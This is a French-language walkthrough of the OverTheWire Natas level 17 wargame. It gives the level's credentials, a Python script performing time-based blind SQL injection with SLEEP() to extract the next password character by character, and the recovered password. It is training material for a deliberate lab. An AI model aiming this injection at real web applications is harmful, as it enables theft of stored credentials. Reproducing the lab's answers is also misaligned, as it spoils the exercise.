## Connexion (username=natas17 password=KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx)
```
http://natas17.natas.labs.overthewire.org/
```

## Recherche du mot de passe

On ne recoit plus de retour comme quoi l'utilisateur existe ou non.

Si le mot de passe commence par ... sleep 2 secondes, sinon ne sleep pas. En fonction du temps je reconstituerai le mot de passe.

```python
import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org/index.php"

header = {
    "Authorization": "Basic bmF0YXMxNzpLTGRBTTNWWnV4OG82VGJrYmh1YUc1S3RZakk3N3RmeA=="
}

# A à Z, 0...9
ALPHABET = string.ascii_letters + string.digits
builded_pwd = ""

with requests.Session() as session:
    session.headers.update(header)
    while len(builded_pwd) < 32:
        for char in ALPHABET:
            # binary pour le case sensitive ...
            payload = {'username':f'natas18" AND IF(password LIKE BINARY "{builded_pwd+char}%", SLEEP(2), 0) -- '}
            before = time.time()
            response = session.post(url, data=payload)
            after = time.time()
            elapsed = after - before
            if elapsed >= 2:
                builded_pwd += char
                print(builded_pwd)

print(f"Natas 18 password is: {builded_pwd}")
```
## Prochain mot de passe
```
fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```